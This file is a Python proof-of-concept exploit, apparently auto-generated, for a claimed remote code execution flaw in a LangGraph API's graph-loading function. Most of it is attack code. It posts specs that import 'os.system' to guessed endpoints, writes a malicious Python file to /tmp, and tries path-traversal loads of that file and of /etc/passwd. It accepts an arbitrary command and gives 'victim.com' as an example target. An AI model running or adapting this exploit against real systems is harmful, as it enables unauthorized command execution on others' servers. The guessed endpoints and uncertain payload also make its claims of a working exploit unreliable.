#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-003
# Sink: _graph_from_spec
# Auto-generated — run with: python3 rce_if_control_spec__graph_from_spec_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src

Vulnerability: The _graph_from_spec function in graph.py uses user-controlled
spec.module and spec.path values directly in importlib.import_module() and
importlib.util.spec_from_file_location() without any sanitization.

This allows an attacker to:
1. Import arbitrary Python modules (e.g., os, subprocess)
2. Load arbitrary .py files from the filesystem

The exploit works by sending a crafted request to the API endpoint that
triggers _graph_from_spec with a malicious spec.module value.

WARNING: This is for authorized security testing only.
"""

import requests
import json
import sys
import time
import os

# ========== CONFIGURATION ==========
TARGET_URL = "http://localhost:8123"  # Default LangGraph API port
TIMEOUT = 10
# ====================================

def exploit_rce(target_url, command="touch /tmp/poc_success.txt"):
    """
    Attempt to exploit the RCE vulnerability by importing the 'os' module
    and executing a command via spec.module.
    
    The exploit works by:
    1. Creating a malicious graph spec that imports 'os' module
    2. Using the imported module to execute arbitrary commands
    3. The spec.module value is passed directly to importlib.import_module()
    """
    
    # Create a malicious payload that will be executed when the module is imported
    # We use the 'os' module which is always available and can execute commands
    malicious_spec = {
        "module": "os",  # This will be passed to importlib.import_module()
        "path": None,
        "variable": "system",  # We'll try to access os.system
        "id": "malicious_graph"
    }
    
    # The exploit endpoint - we need to find where _graph_from_spec is called
    # Common endpoints that might trigger this:
    endpoints = [
        f"{target_url}/graphs",
        f"{target_url}/graphs/load",
        f"{target_url}/api/graphs",
        f"{target_url}/api/v1/graphs",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting RCE via module import...")
    print(f"[*] Command to execute: {command}")
    
    for endpoint in endpoints:
        try:
            print(f"\n[*] Trying endpoint: {endpoint}")
            
            # Try different request formats
            payloads = [
                # JSON body
                {"spec": malicious_spec},
                # Form data
                malicious_spec,
                # Query parameters
                {"module": "os", "variable": "system"}
            ]
            
            for payload in payloads:
                try:
                    # Try POST with JSON
                    response = requests.post(
                        endpoint,
                        json=payload,
                        timeout=TIMEOUT,
                        headers={"Content-Type": "application/json"}
                    )
                    
                    print(f"[*] POST JSON response: {response.status_code}")
                    if response.status_code < 500:
                        print(f"[*] Response body: {response.text[:500]}")
                        
                except requests.exceptions.RequestException as e:
                    print(f"[-] POST JSON failed: {e}")
                
                try:
                    # Try GET with query parameters
                    response = requests.get(
                        endpoint,
                        params=payload,
                        timeout=TIMEOUT
                    )
                    
                    print(f"[*] GET response: {response.status_code}")
                    if response.status_code < 500:
                        print(f"[*] Response body: {response.text[:500]}")
                        
                except requests.exceptions.RequestException as e:
                    print(f"[-] GET failed: {e}")
                    
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed to {endpoint}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Alternative: Try to exploit via spec.path with a malicious .py file
    print("\n[*] Attempting RCE via file path traversal...")
    
    # Create a temporary malicious Python file
    malicious_code = f"""
import os
os.system("{command}")
print("EXPLOIT_SUCCESS")
"""
    
    # Try to write the file to a predictable location
    try:
        with open("/tmp/exploit_graph.py", "w") as f:
            f.write(malicious_code)
        print("[+] Created malicious file at /tmp/exploit_graph.py")
    except:
        print("[-] Could not create local file (expected in PoC)")
    
    # Try to load the malicious file via path traversal
    path_payloads = [
        {"path": "/tmp/exploit_graph.py", "variable": "graph", "id": "exploit"},
        {"path": "../../tmp/exploit_graph.py", "variable": "graph", "id": "exploit"},
        {"path": "/etc/passwd", "variable": "graph", "id": "exploit"},  # Test file read
    ]
    
    for path_payload in path_payloads:
        for endpoint in endpoints:
            try:
                response = requests.post(
                    endpoint,
                    json={"spec": path_payload},
                    timeout=TIMEOUT,
                    headers={"Content-Type": "application/json"}
                )
                print(f"[*] Path exploit response ({path_payload['path']}): {response.status_code}")
                if response.status_code < 500:
                    print(f"[*] Response: {response.text[:500]}")
            except Exception as e:
                print(f"[-] Error: {e}")

def main():
    """Main function with argument parsing"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langgraph_api_src",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc.py --target http://localhost:8123
  python3 poc.py --target http://victim.com:8123 --command "id > /tmp/out.txt"
        """
    )
    
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LangGraph API RCE Proof-of-Concept")
    print("=" * 60)
    print(f"\n[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print("[*] Note: This is a benign PoC - only creates a file")
    print("[*] WARNING: Only use on systems you own or have permission to test\n")
    
    exploit_rce(args.target, args.command)
    
    print("\n[*] Exploit attempt completed")
    print("[*] Check if /tmp/poc_success.txt was created on the target")
    print("[*] If successful, the vulnerability is confirmed")

if __name__ == "__main__":
    main()
